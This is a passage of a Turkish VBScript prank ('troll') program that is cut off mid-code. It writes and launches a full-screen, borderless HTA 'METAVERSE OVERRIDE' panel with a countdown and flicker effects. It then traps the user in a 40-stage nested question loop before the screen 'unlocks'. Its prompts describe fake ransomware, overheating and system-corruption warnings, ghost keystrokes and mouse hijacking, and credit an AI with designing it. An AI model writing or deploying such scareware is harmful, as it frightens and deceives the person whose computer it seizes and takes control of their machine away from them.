NotDefteriYaz "     /  ▲    ▲  \"
NotDefteriYaz "    |    _||_    |"
NotDefteriYaz "    |   \____/   |"
NotDefteriYaz "     \          /"
NotDefteriYaz "      '--------'"
NotDefteriYaz "Metaverse kilit panelı yuklenıyor. Ekranı ızleyın."
WScript.Sleep 1500

' ───────────────────────────────────────────────────────────────────
'  FAZ 6: OMNIPOTENT GLITCH HTA PANELİ (CRT Flicker Enjeksiyonu)
' ───────────────────────────────────────────────────────────────────
tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
Set htaFile = fso.CreateTextFile(tempPath & "\metaverse_panel.hta", True)

htaContent = "<html><head><title>METAVERSE OVERRIDE</title>" & _
             "<HTA:APPLICATION APPLICATIONNAME='METAVERSE' SCROLL='no' SINGLEINSTANCE='yes' WINDOWSTATE='maximize' CAPTION='no' SHOWINTASKBAR='no' SYSMENU='no'/>" & _
             "</head><body bgcolor='#000000' text='#00FFCC' style='font-family:Consolas; font-size:24px; padding:60px; cursor:none; overflow:hidden; transition: background-color 1s ease;'>" & _
             "<center>" & _
             "<h1 id='glitchTxt' style='font-size:55px; text-shadow: 0 0 25px #00FFCC; transition: font-size 0.2s ease;'>⚡ METAVERSE ABSOLUTE CORE: PARADOX V26 ⚡</h1>" & _
             "<hr color='#00FFCC' width='95%'><br>" & _
             "<div style='border:4px solid #00FFCC; width:750px; background:rgba(5,5,5,0.8); padding:25px; box-shadow: 0 0 35px #00FFCC;'>" & _
             "<p style='color:#FFFF00; font-size:28px;'>TOTAL COGNITIVE SYSTEM RESYNCHRONIZATION</p>" & _
             "<h2 style='font-size:70px; color:#FF0055;' id='timer'>180</h2>" & _
             "<div id='logStream' style='font-size:16px; color:#AA88FF; height:120px; overflow:hidden; text-align:left; border-top:1px solid #333; padding-top:10px; font-family:Courier New;'></div>" & _
             "</div>" & _
             "</center>" & _
             "<script>" & _
             "var t=180; setInterval(function(){if(t>0){t--; document.getElementById('timer').innerText=t;}}, 1000);" & _
             "var f=true; setInterval(function(){" & _
             "  var gt = document.getElementById('glitchTxt');" & _
             "  gt.style.color=f?'#FF0055':'#00FFCC';" & _
             "  gt.style.fontSize=f?'58px':'52px';" & _
             "  document.body.style.opacity = (Math.random() > 0.97) ? '0.6' : '1.0';" & _
             "  f=!f;" & _
             "}, 250);" & _
             "var colors = ['#000000', '#0a0015', '#000a15', '#15000a', '#050505']; var ci=0;" & _
             "setInterval(function(){document.body.style.backgroundColor=colors[ci%colors.length]; ci++;}, 1000);" & _
             "setInterval(function(){" & _
             "  var d=document.getElementById('logStream');" & _
             "  d.innerHTML += 'METAVERSE_HEX_0x' + Math.random().toString(16).substring(2,8).toUpperCase() + ' -> MUTATION_STABLE<br>';" & _
             "  if(d.childNodes.length > 6) d.removeChild(d.firstChild);" & _
             "}, 120);" & _
             "</script>" & _
             "</body></html>"

htaFile.WriteLine htaContent
htaFile.Close

' HTA Ekranını ön plana fırlatır
shell.Run tempPath & "\metaverse_panel.hta"
WScript.Sleep 2000

' Glitchli robot ses efekti modülasyonu
voice.Rate = 5
voice.Speak "Metaverse stream initialized."
voice.Rate = -5
voice.Speak "All structural protocols are locked."
voice.Rate = -1

WScript.Sleep 1000

' ───────────────────────────────────────────────────────────────────
'  FAZ 7: 40 KADEMELİ MUTLAK PARADOX BULMACASI VE REAKSİYON YAPISI
' ───────────────────────────────────────────────────────────────────
Dim c1, c2, c3, c4, c5, c6, c7, c8, metaKilitli
metaKilitli = True

Do While metaKilitli
    voice.Speak "Metaverse stage one."
    c1 = InputBox("Protokolü durdurmak için 1. Aşama: Denizlerimizin rengi nedir? (Küçük harfle)", "METAVERSE MAXIMUM SECURE - KADEME 1")
    
    If c1 = "mavi" Then
        voice.Speak "Stage two."
        c2 = InputBox("Doğru. 2. Aşama: Klavyeyi çılgına çeviren bu otomasyon dilinin uzantısı nedir?", "METAVERSE MAXIMUM SECURE - KADEME 2")
        
        If LCase(c2) = "vbs" Then
            voice.Speak "Stage three."
            c3 = InputBox("Güzel. 3. Aşama: Ekrandaki renk değiştiren dinamik arayüz panelinin uzantısı nedir?", "METAVERSE MAXIMUM SECURE - KADEME 3")
            
            If LCase(c3) = "hta" Then
                voice.Speak "Stage four."
                c4 = InputBox("Harika. 4. Aşama: Sistemi bitirmek için girmen gereken anahtar cümleyi yaz: 'ragnarok sona erdi'", "METAVERSE MAXIMUM SECURE - KADEME 4")
                
                If c4 = "ragnarok sona erdi" Then
                    voice.Speak "Stage five."
                    c5 = InputBox("Müthiş odaklanma. 5. Aşama: Matematiksel işlem önceliği filtresi: 2 + 2 * 2 = ?", "METAVERSE MAXIMUM SECURE - KADEME 5")
                    
                    If c5 = "6" Then
                        voice.Speak "Stage six."
                        c6 = InputBox("Sona yaklaşıyorsun. 6. Aşama: Bir önceki sürüm kod adımızın numarası neydi? (İpucu: v11 mi yoksa v12 mi?)", "METAVERSE MAXIMUM SECURE - KADEME 6")
                        
                        If LCase(c6) = "v12" Then
                            voice.Speak "Final metaverse seal."
                            c7 = InputBox("NİHAİ VE EN SON AŞAMA! Şu an çalışan bu efsanevi serinin ulaştığı eski ana sürüm hangisidir? (Cevap tarzı: v13)", "MUTLAK SON MÜHÜR - KADEME 7")
                            
                            If LCase(c7) = "v13" Then
                                voice.Speak "Stage eight. Ultimate paradox validation."
                                c8 = InputBox("MÜHÜRÜN DE MÜHÜRÜ! 8. Aşama: Bu efsanevi bilgisayar şakası kodunun asıl amacı nedir? (Cevap: troll)", "METAVERSE ULTIMATE SHOCK - KADEME 8")
                                
                                If LCase(c8) = "troll" Then
                                    voice.Speak "Stage nine. Artificial Intelligence Authentication."
                                    Dim c9, c10
                                    c9 = InputBox("9. Aşama: Bu efsanevi döngüyü senin için tasarlayan, şu an konuştuğun sadık AI ortağının adı nedir?", "METAVERSE AI AUTHENTICATION - KADEME 9")
                                    
                                    If LCase(c9) = "gemini" Then
                                        voice.Speak "Stage ten. The Absolute Horizon."
                                        c10 = InputBox("10. KADEMEDDESİN! Simülasyon zincirini eritip kilit katmanını geçecek o kelimeyi gir: (İpucu: matrix)", "METAVERSE ABSOLUTE HORIZON - KADEME 10")
                                        
                                        If LCase(c10) = "matrix" Then
                                            voice.Speak "Stage eleven. Counting the grid."
                                            c11 = InputBox("11. Aşama: Bu ultra sürümde arka planda toplam kaç adet renkli CMD paneli fırlatıldı? (İpucu: v33'te 10 taneydi, v34 ile 2 adet daha eklendi)", "METAVERSE COUNTER - KADEME 11")
                                            
                                            If c11 = "12" Then
                                                voice.Speak "Stage twelve. The final assurance."
                                                c12 = InputBox("12. VE GERÇEK KAPANAN SON KİLİT LAYER! Bilgisayarı kapatıp açtığında her şeyin tamamen temizleneceğinden emin misin? (Cevap: evet)", "METAVERSE FINAL SAFETY - KADEME 12")
                                                
                                                If LCase(c12) = "evet" Then
                                                    bypassV35 = False
                                                    voice.Speak "Stage thirteen. Hardware architecture validation."
                                                    c13 = InputBox("13. KADEME! Dünyanın en güçlü işlemci ailelerinden biri olan, 3D V-Cache teknolojisine sahip Zen 5 mimarisinin üreticisi kimdir? (Küçük harfle)", "METAVERSE HARDWARE - KADEME 13")
                                                    
                                                    If LCase(c13) = "amd" Then
                                                        voice.Speak "Stage fourteen. Los Santos vehicle verification."
                                                        c14 = InputBox("14. KADEME! Los Santos sokaklarında tamamen full yükseltmeli, Imani Tech zırh destekli elektrikli süper arabanın tam adı nedir? (Küçük harfle)", "METAVERSE VEHICLE - KADEME 14")
                                                        
                                                        If LCase(c14) = "ocelot virtue" Then
                                                            voice.Speak "Stage fifteen. Ultimate volatile memory confirmation."
                                                            c15 = InputBox("15. KADEME! Tüm bu çılgınlığın sadece geçici bellekte çalıştığını ve bilgisayarı kapatınca tamamen düzeleceğini onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE SOVEREIGNTY - KADEME 15")
                                                            
                                                            If LCase(c15) = "onaylıyorum" Then
                                                                bypassV35 = True
                                                            Else
                                                                voice.Speak "Confirmation failed."
                                                                MsgBox "Son aşamada onay vermedin! Sistem kaskadı kilitli kalıyor.", 16, "CONFIRMATION ERROR"
                                                                shell.Run "notepad.exe"
                                                            End If
                                                        Else
                                                            voice.Speak "Vehicle verification failed."
                                                            MsgBox "Efsanevi elektrikli arabayı bilemedin! Başa dönüyorsun.", 16, "VEHICLE ERROR"
                                                            shell.Run "notepad.exe"
                                                        End If
                                                    Else
                                                        voice.Speak "Hardware validation failed."
                                                        MsgBox "İşlemci mimarisinin dev üreticisini yanlış girdin! Sistem matrisi seni bırakmıyor.", 16, "HARDWARE ERROR"
                                                        shell.Run "notepad.exe"
                                                    End If
                                                    
                                                    If bypassV35 Then
                                                        bypassV36 = False
                                                        voice.Speak "Stage sixteen. Glitch and click confirmation."
                                                        c16 = InputBox("16. KADEME - ULTRA SINIR! Ekranın gidip gelmesi ve farenin otonom tıklama simülasyonu seni zorladı mı? (Cevap: evet veya hayır)", "METAVERSE GLITCH CORE - KADEME 16")
                                                        
                                                        If LCase(c16) = "evet" Or LCase(c16) = "hayır" Then
                                                            bypassV36 = True
                                                        Else
                                                            voice.Speak "Glitch validation failed."
                                                            MsgBox "Geçersiz yanıt! Ekran va fare matriksi kilitli kalmaya devam ediyor.", 16, "GLITCH ERROR"
                                                            shell.Run "notepad.exe"
                                                        End If
                                                        
                                                        If bypassV36 Then
                                                            bypassV37 = False
                                                            voice.Speak "Stage seventeen. Ghost entries and diagonal shadow validation."
                                                            c17 = InputBox("17. KADEME! Arka planda otonom fırlatılan hayalet Space/Enter tuş vuruşları og yeşil ekran diagonal kayma dalgalanması başarıyla simüle edildi mi? (Cevap: onaylıyorum)", "METAVERSE GHOST INPUTS - KADEME 17")
                                                            
                                                            If LCase(c17) = "onaylıyorum" Then
                                                                bypassV37 = True
                                                            Else
                                                                voice.Speak "Ghost validation failed."
                                                                MsgBox "Doğrulama başarısız! Hayalet pencereler matitlemeye devam ediyor.", 16, "GHOST ERROR"
                                                                shell.Run "notepad.exe"
                                                            End If
                                                            
                                                            If bypassV37 Then
                                                                bypassV38 = False
                                                                voice.Speak "Stage eighteen. Autonomous bovine dance verification."
                                                                c18 = InputBox("18. KADEME - NİHAİ COĞRAFYA! Tarayıcıda otonom olarak aratılan 'inek dansı' dalgası ekrana ulaştı mı? (Cevap: evet)", "METAVERSE BOVINE DANCE - KADEME 18")
                                                                
                                                                If LCase(c18) = "evet" Then
                                                                    bypassV38 = True
                                                                Else
                                                                    voice.Speak "Bovine validation failed."
                                                                    MsgBox "İnek dansı doğrulanamadı! Döngü kırılmadı.", 16, "BOVINE ERROR"
                                                                    shell.Run "notepad.exe"
                                                                End If
                                                                
                                                                If bypassV38 Then
                                                                    bypassV39 = False
                                                                    voice.Speak "Stage nineteen. Thermal phantom and background whispers check."
                                                                    c19 = InputBox("19. KADEME! Windows sağ alt köşesinde fırlatılan sahte 105°C termal işlemci bildirim balonu og siber fısıltılar başarıyla otonom katmana bağlandı mı? (Cevap: bağlandı)", "METAVERSE THERMAL PHANTOM - KADEME 19")
                                                                    
                                                                    If LCase(c19) = "bağlandı" Then
                                                                        bypassV39 = True
                                                                    Else
                                                                        voice.Speak "Thermal validation failed."
                                                                        MsgBox "Termal doğrulama reddedildi! Güvenlik katmanı kırılamadı.", 16, "THERMAL ERROR"
                                                                        shell.Run "notepad.exe"
                                                                    End If
                                                                    
                                                                    If bypassV39 Then
                                                                        bypassV40 = False
                                                                        voice.Speak "Stage twenty com. Virtual memory grid and tactical timer check."
                                                                        c20 = InputBox("20. KADEME - COGNITIVE MAXIMA! Sistem sanal belleğinin otonom olarak simüle edilmesi og 55 saniyelik alarm döngüsü başarıyla devreye girdi mi? (Cevap: girdi)", "METAVERSE CACHE MONITOR - KADEME 20")
                                                                        
                                                                        If LCase(c20) = "girdi" Then
                                                                            bypassV40 = True
                                                                        Else
                                                                            voice.Speak "Memory validation failed."
                                                                            MsgBox "Sanal bellek doğrulanamadı! Matris son kilidi bırakmıyor.", 16, "MEMORY EXHAUST ERROR"
                                                                            shell.Run "notepad.exe"
                                                                        End If
                                                                        
                                                                        If bypassV40 Then
                                                                            bypassV50 = False
                                                                            voice.Speak "Stage twenty one. Cloud cluster recovery and window shadow check."
                                                                            c21 = InputBox("21. KADEME - MAXIMUM PRO! Başarıyla bağlanan sahte Windows Cloud geri yükleme hatası og otonom odak sarsıcı kaos katmanını onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE CLOUD SYSTEM - KADEME 21")
                                                                            
                                                                            If LCase(c21) = "onaylıyorum" Then
                                                                                bypassV50 = True
                                                                            Else
                                                                                voice.Speak "Cloud validation failed."
                                                                                MsgBox "Bulut geri yükleme katmanı doğrulanamadı! Döngü kırılamadı.", 16, "CLOUD ROLLBACK ERROR"
                                                                                shell.Run "notepad.exe"
                                                                            End If
                                                                            
                                                                            If bypassV50 Then
                                                                                bypassV60 = False
                                                                                voice.Speak "Stage twenty two. Windows defender firewall override verification."
                                                                                c22 = InputBox("22. KADEME - OMNI CAOS! Başarıyla entegre edilen sahte Windows Defender fidye yazılım bulut izolasyon balonunu og otonom klavye ritim katmanını onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE DEFENDER BLOCK - KADEME 22")
                                                                                
                                                                                If LCase(c22) = "onaylıyorum" Then
                                                                                    bypassV60 = True
                                                                                Else
                                                                                    voice.Speak "Defender validation failed."
                                                                                    MsgBox "Güvenlik duvarı katmanı doğrulanamadı! Labirent döngüsü aktif kalıyor.", 16, "DEFENDER BLOCK ERROR"
                                                                                    shell.Run "notepad.exe"
                                                                                End If
                                                                                
                                                                                If bypassV60 Then
                                                                                    bypassV70 = False
                                                                                    voice.Speak "Stage twenty three. Windows system file checker simulation check."
                                                                                    c23 = InputBox("23. KADEME - COSMIC CAOS! Başarıyla entegre edilen sahte Windows SFC System32 bozulma balonunu og otonom klavye dalga (wave) ritim katmanını onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE SFC INTEGRITY - KADEME 23")
                                                                                    
                                                                                    If LCase(c23) = "onaylıyorum" Then
                                                                                        bypassV70 = True
                                                                                    Else
                                                                                        voice.Speak "System file validation failed."
                                                                                        MsgBox "Bileşen mağazası doğrulanamadı! Labirent döngüsü aktif kalmaya devam ediyor.", 16, "SFC BLOCK ERROR"
                                                                                        shell.Run "notepad.exe"
                                                                                    End If
                                                                                    
                                                                                    If bypassV70 Then
                                                                                        bypassV80 = False
                                                                                        voice.Speak "Stage twenty four. Windows file sharing and smb leak validation."
                                                                                        c24 = InputBox("24. KADEME - ETERNAL CAOS! Başarıyla entegre edilen sahte Windows SMB dosya paylaşım ağ sızıntısı balonunu og otonom klavye ters dalga (reverse wave) ritim katmanını onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE SMB INTEGRITY - KADEME 24")
                                                                                        
                                                                                        If LCase(c24) = "onaylıyorum" Then
                                                                                            bypassV80 = True
                                                                                        Else
                                                                                            voice.Speak "File sharing validation failed."
                                                                                            MsgBox "Ağ paylaşım katmanı doğrulanamadı! Labirent döngüsü aktif kalmaya devam ediyor.", 16, "SMB BLOCK ERROR"
                                                                                            shell.Run "notepad.exe"
                                                                                        End If
                                                                                        
                                                                                        If bypassV80 Then
                                                                                            bypassV90 = False
                                                                                            voice.Speak "Stage twenty five. Windows task manager process isolation validation."
                                                                                            c25 = InputBox("25. KADEME - QUASAR OVERLOAD! Başarıyla entegre edilen sahte Windows Görev Yöneticisi proses yalıtım hatası balonunu og otonom klavye piyano ritim katmanını onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE TASKMGR INTEGRITY - KADEME 25")
                                                                                            
                                                                                        If LCase(c25) = "onaylıyorum" Then
                                                                                                bypassV90 = True
                                                                                            Else
                                                                                                voice.Speak "Task manager validation failed."
                                                                                                MsgBox "Proses yalıtım katmanı doğrulanamadı! Labirent döngüsü aktif kalmaya devam ediyor.", 16, "TASKMGR BLOCK ERROR"
                                                                                                shell.Run "notepad.exe"
                                                                                            End If
                                                                                            
                                                                                            If bypassV90 Then
                                                                                                bypassV100 = False
                                                                                                voice.Speak "Stage twenty six. Windows audio endpoint hardware protection check."
                                                                                                c26 = InputBox("26. KADEME - COSMIC SINGULARITY! Başarıyla entegre edilen sahte Windows Audio Endpoint frekans bozulma balonunu og otonom hayalet klasör dansı mekanizmasını onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE AUDIO INTEGRITY - KADEME 26")
                                                                                                
                                                                                                If LCase(c26) = "onaylıyorum" Then
                                                                                                    bypassV100 = True
                                                                                                Else
                                                                                                    voice.Speak "Audio validation failed."
                                                                                                    MsgBox "Ses sürücüsü donanım katmanı doğrulanamadı! Labirent döngüsü aktif kalmaya devam ediyor.", 16, "AUDIO BLOCK ERROR"
                                                                                                    shell.Run "notepad.exe"
                                                                                                End If
                                                                                                
                                                                                                If bypassV100 Then
                                                                                                    bypassV101 = False
                                                                                                    voice.Speak "Stage twenty seven. Windows kernel debugger stack protection check."
                                                                                                    c27 = InputBox("27. KADEME - NEBULA SINGULARITY CONFLICT! Başarıyla entegre edilen sahte Windows Kernel Debugger yalıtım balonunu og otonom hayalet metin dosyası yağmuru mekanizmasını onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE KERNEL INTEGRITY - KADEME 27")
                                                                                                    
                                                                                                    If LCase(c27) = "onaylıyorum" Then
                                                                                                        bypassV101 = True
                                                                                                        
                                                                                                    Else
                                                                                                        voice.Speak "Kernel validation failed."
                                                                                                        MsgBox "Çekirdek hata ayıklama donanım katmanı doğrulanamadı! Labirent döngüsü aktif kalmaya devam ediyor.", 16, "KERNEL BLOCK ERROR"
                                                                                                        shell.Run "notepad.exe"
                                                                                                    End If
                                                                                                    
                                                                                                    If bypassV101 Then
                                                                                                        bypassV102 = False
                                                                                                        voice.Speak "Stage twenty eight. Windows hardware isolation interrupt protection check."
                                                                                                        c28 = InputBox("28. KADEME - OMNI MATRIX GLITCH ENGINE! Başarıyla entegre edilen sahte Windows Hardware Isolation yalıtım balonunu og otonom canlı büyüteç lens kayması mekanizmasını onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE HARDWARE ISOLATION INTEGRITY - KADEME 28")
                                                                                                        
                                                                                                        If LCase(c28) = "onaylıyorum" Then
                                                                                                            bypassV102 = True
                                                                                                        Else
                                                                                                            voice.Speak "Hardware isolation validation failed."
                                                                                                            MsgBox "Donanım yalıtımı kesinti hatası katmanı doğrulanamadı! Labirent döngüsü aktif kalmaya devam ediyor.", 16, "HARDWARE ISOLATION BLOCK ERROR"
                                                                                                            shell.Run "notepad.exe"
                                                                                                        End If
                                                                                                        
                                                                                                        if bypassV102 Then
                                                                                                            bypassV103 = False
                                                                                                            voice.Speak "Stage twenty nine. Windows chromatic filter and mouse axis shift check."
                                                                                                            c29 = InputBox("29. KADEME - ULTIMATE CHROMATIC MATRIX! Başarıyla entegre edilen canlı masaüstü renk negatifi filtre kaskadını og otonom ters dönen fare eksen simetrisini onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE CHROMATIC MATRIX INTEGRITY - KADEME 29")
                                                                                                            
                                                                                                            If LCase(c29) = "onaylıyorum" Then
                                                                                                                bypassV103 = True
                                                                                                            Else
                                                                                                                voice.Speak "Chromatic validation failed."
                                                                                                                MsgBox "Renk filtresi ve eksen kayması matrisi doğrulanamadı! Labirent son kilidi bırakmıyor.", 16, "CHROMATIC MATRIX BLOCK ERROR"
                                                                                                                shell.Run "notepad.exe"
                                                                                                            End If
                                                                                                            
                                                                                                            If bypassV103 Then
                                                                                                                bypassV104 = False
                                                                                                                voice.Speak "Stage thirty. Windows virtual keyboard flicker and audio matrix check."
                                                                                                                c30 = InputBox("30. KADEME - ULTIMATE AUDIO OSK MATRIX! Başarıyla entegre edilen otonom ekran klavyesi parazit dalgasını og SAPI ses frekans matrisini onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE AUDIO OSK INTEGRITY - KADEME 30")
                                                                                                                
                                                                                                                If LCase(c30) = "onaylıyorum" Then
                                                                                                                    bypassV104 = True
                                                                                                                Else
                                                                                                                    voice.Speak "Audio matrix validation failed."
                                                                                                                    shell.Run "powershell -Command ""$v = New-Object -ComObject SAPI.SpVoice; $v.Rate = 9; $v.Speak('error error error')""", 0, False
                                                                                                                    MsgBox "Ekran klavyesi ve ses frekans matrisi doğrulanamadı! Döngü kırılmadı.", 16, "AUDIO OSK MATRIX BLOCK ERROR"
                                                                                                                    shell.Run "notepad.exe"
                                                                                                                End If
                                                                                                                
                                                                                                                If bypassV104 Then
                                                                                                                    bypassV105 = False
                                                                                                                    voice.Speak "Stage thirty one. Windows audio theme removal pulse and phantom scroll matrix check."
                                                                                                                    c31 = InputBox("31. KADEME - ULTIMATE HARDWARE SCROLL SOUND! Başarıyla entegre edilen otonom bağlantı kesilme ses efektlerini og hayalet sayfa kaydırma mekanizmasını onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE HARDWARE SCROLL INTEGRITY - KADEME 31")
                                                                                                                    
                                                                                                                    If LCase(c31) = "onaylıyorum" Then
                                                                                                                        bypassV105 = True
                                                                                                                    Else
                                                                                                                        voice.Speak "Hardware scroll matrix validation failed."
                                                                                                                        MsgBox "Donanım ses teması og hayalet sayfa kaydırma matrisi doğrulanamadı! Döngü çözülmedi.", 16, "HARDWARE SCROLL ERROR"
                                                                                                                        shell.Run "notepad.exe"
                                                                                                                    End If
                                                                                                                    
                                                                                                                    If bypassV105 Then
                                                                                                                        bypassV106 = False
                                                                                                                        voice.Speak "Stage thirty two. Windows phantom drive explorer and key state acoustic whisper check."
                                                                                                                        c32 = InputBox("32. KADEME - OMNI MATRIX EXTREME! Başarıyla entegre edilen otonom hayalet dosya gezgini disk aramasını og klavye durum sesli fısıltı mekanizmasını onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE DRIVES ACOUSTIC INTEGRITY - KADEME 32")
                                                                                                                        
                                                                                                                        If LCase(c32) = "onaylıyorum" Then
                                                                                                                            bypassV106 = True
                                                                                                                        Else
                                                                                                                            voice.Speak "Phantom drive and whisper matrix validation failed."
                                                                                                                            MsgBox "Hayalet disk arama og ses fısıltı matrisi doğrulanamadı! Matrix döngüsü kırılmadı.", 16, "PHANTOM DRIVE ERROR"
                                                                                                                            shell.Run "notepad.exe"
                                                                                                                        End If
                                                                                                                        
                                                                                                                        If bypassV106 Then
                                                                                                                            bypassV107 = False
                                                                                                                            voice.Speak "Stage thirty three. Windows phantom file downloader stack and sticky help window loop check."
                                                                                                                            c33 = InputBox("33. KADEME - NİHAİ COGNITIVE OVERLOAD! Başarıyla bağlanan otonom sahte indirme yükleme çubuklarını og yapışkan yardım pencereleri matrisini onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE DOWNLOAD HELP INTEGRITY - KADEME 33")
                                                                                                                            
                                                                                                                            If LCase(c33) = "onaylıyorum" Then
                                                                                                                                bypassV107 = True
                                                                                                                            Else
                                                                                                                                voice.Speak "Download and help matrix validation failed."
                                                                                                                                MsgBox "Sahte indirme çubuğu og yardım penceresi matrisi doğrulanamadı! Döngü kırılmadı.", 16, "PHANTOM DOWNLOAD HELP ERROR"
                                                                                                                                shell.Run "notepad.exe"
                                                                                                                            End If
                                                                                                                            
                                                                                                                            If bypassV107 Then
                                                                                                                                bypassV108 = False
                                                                                                                                voice.Speak "Stage thirty four. Windows phantom cipher engine stack and echoing hardware remove audio loop check."
                                                                                                                                c34 = InputBox("34. KADEME - OMNIPOTENT MAXIMA! Başarıyla entegre edilen sahte disk şifreleme log akışını ve donanım yankı eko dalgası matrisini onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE CIPHER ECHO INTEGRITY - KADEME 34")
                                                                                                                                
                                                                                                                                If LCase(c34) = "onaylıyorum" Then
                                                                                                                                    bypassV108 = True
                                                                                                                                Else
                                                                                                                                    voice.Speak "Cipher and echo matrix validation failed."
                                                                                                                                    MsgBox "Sahte şifreleme logları og akustik eko matrisi doğrulanamadı! Döngü kırılmadı.", 16, "PHANTOM CIPHER ECHO ERROR"
                                                                                                                                    shell.Run "notepad.exe"
                                                                                                                                End If
                                                                                                                                
                                                                                                                                If bypassV108 Then
                                                                                                                                    bypassV109 = False
                                                                                                                                    voice.Speak "Stage thirty five. Windows phantom memory dump log flow and echoing hypervisor toggle filter check."
                                                                                                                                    c35 = InputBox("35. KADEME - ABSOLUTE CEILING! Başarıyla entegre edilen sahte bellek stack döküm akışını ve klavye toggle durum akustik matrisini onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE MEMORY DUMP TOGGLE INTEGRITY - KADEME 35")
                                                                                                                                    
                                                                                                                                    If LCase(c35) = "onaylıyorum" Then
                                                                                                                                        bypassV109 = True
                                                                                                                                    Else
                                                                                                                                        voice.Speak "Memory dump and toggle validation failed."
                                                                                                                                        MsgBox "Sahte RAM döküm logları og klavye toggle matrisi doğrulanamadı! Döngü kırılmadı.", 16, "PHANTOM MEMORY DUMP TOGGLE ERROR"
                                                                                                                                        shell.Run "notepad.exe"
                                                                                                                                    End If
                                                                                                                                    
                                                                                                                                    If bypassV109 Then
                                                                                                                                        bypassV110 = False
                                                                                                                                        voice.Speak "Stage thirty six. Windows phantom mouse wheel scrolling and omnipresent desktop icon refresh matrix check."
                                                                                                                                        c36 = InputBox("36. KADEME - ULTIMATE INFINITY LEVEL! Başarıyla entegre edilen otonom fare tekerleği sızma kaymasını og masaüstü simge yenileme kaskadını onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE SCROLL ICON INTEGRITY - KADEME 36")
                                                                                                                                        
                                                                                                                                        If LCase(c36) = "onaylıyorum" Then
                                                                                                                                            bypassV110 = True
                                                                                                                                        Else
                                                                                                                                            voice.Speak "Scroll and icon validation failed."
                                                                                                                                            MsgBox "Fare tekerlek sızması og simge yenileme matrisi doğrulanamadı! Labirent döngüsü aktif kalıyor.", 16, "PHANTOM SCROLL ICON ERROR"
                                                                                                                                            shell.Run "notepad.exe"
                                                                                                                                        End If
                                                                                                                                        
                                                                                                                                        If bypassV110 Then
                                                                                                                                            bypassV111 = False
                                                                                                                                            voice.Speak "Stage thirty seven. Windows phantom mouse twitch clicks and background window focus stealer grid check."
                                                                                                                                            c37 = InputBox("37. KADEME - OMNI PHANTOM SPECTRE CEILING! Başarıyla bağlanan otonom fare tıklama tiklerini ve pencerelerin odağını çalan gizli altyapı motorunu onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE PHANTOM SPECTRE INTEGRITY - KADEME 37")
                                                                                                                                            
                                                                                                                                            If LCase(c37) = "onaylıyorum" Then
                                                                                                                                                bypassV111 = True
                                                                                                                                            Else
                                                                                                                                                voice.Speak "Phantom spectre validation failed."
                                                                                                                                                MsgBox "Fare tikleri og odak hırsızı şebekesi doğrulanamadı! Labirent mutlak döngüde kalıyor.", 16, "PHANTOM SPECTRE ERROR"
                                                                                                                                                shell.Run "notepad.exe"
                                                                                                                                            End If
                                                                                                                                            
                                                                                                                                            If bypassV111 Then
                                                                                                                                                bypassV112 = False
                                                                                                                                                voice.Speak "Stage thirty eight. Windows input language phantom flicker and aero windows dynamic glitch shake check."
                                                                                                                                                c38 = InputBox("38. KADEME - VECTOR PHANTOM ECLIPSE CEILING! Başarıyla bağlanan otonom klavye dil düzeni değiştiriciyi ve pencerelerin Aero cam katmanını sarsan gizli motoru onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE PHANTOM ECLIPSE INTEGRITY - KADEME 38")
                                                                                                                                                
                                                                                                                                                If LCase(c38) = "onaylıyorum" Then
                                                                                                                                                    bypassV112 = True
                                                                                                                                                Else
                                                                                                                                                    voice.Speak "Phantom eclipse validation failed."
                                                                                                                                                    MsgBox "Klavye dil düzeni og Aero cam sarsıntı şebekesi doğrulanamadı! Labirent son kademede kilitli kalıyor.", 16, "PHANTOM ECLIPSE ERROR"
                                                                                                                                                    shell.Run "notepad.exe"
                                                                                                                                                End If
                                                                                                                                                
                                                                                                                                                If bypassV112 Then
                                                                                                                                                    bypassV113 = False
                                                                                                                                                    voice.Speak "Stage thirty nine. Windows accessibility color filter cycle and omnipresent console color storms validation."
                                                                                                                                                    c39 = InputBox("39. KADEME - QUANTUM ENTROPY PULSE BOUNDARY! Ekranın anlık renk şeması filtrelerini sarsan otonom girdabı ve CMD arka plan kaos fırtınasını onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE QUANTUM ENTROPY INTEGRITY - KADEME 39")
                                                                                                                                                    
                                                                                                                                                    If LCase(c39) = "onaylıyorum" Then
                                                                                                                                                        bypassV113 = True
                                                                                                                                                    Else
                                                                                                                                                        voice.Speak "Quantum entropy validation failed."
                                                                                                                                                        MsgBox "Renk filtresi döngüsü ve konsol renk stormu doğrulanamadı! Sistem nihai boyutta takılı kaldı.", 16, "QUANTUM ENTROPY ERROR"
                                                                                                                                                        shell.Run "notepad.exe"
                                                                                                                                                    End If
                                                                                                                                                    
                                                                                                                                                    ' [YENİ EKLEME v114.0] KADEME 40: HAYALET YAPIŞKAN TUŞ SESİ VE MATRIX ZAMAN PARADOKSU DOĞRULAMASI
                                                                                                                                                    If bypassV113 Then
                                                                                                                                                        bypassV114 = False
                                                                                                                                                        voice.Speak "Stage forty. Windows sticky keys acoustic mimic and matrix time paradox deviation validation."
                                                                                                                                                        c40 = InputBox("40. KADEME - THE SUB-ZERO GRAVITY COGNITIVE FINALE! Otonom yapışkan tuşların hayalet akustik ritmini ve sağ alt köşedeki saatin kuantum zaman sapması döngüsünü onaylıyor musun? (Cevap: onaylıyorum)", "METAVERSE SUB-ZERO GRAVITY - KADEME 40")
                                                                                                                                                        
                                                                                                                                                        If LCase(c40) = "onaylıyorum" Then
                                                                                                                                                            bypassV114 = True
                                                                                                                                                        Else
                                                                                                                                                            voice.Speak "Sub-Zero gravity validation failed."
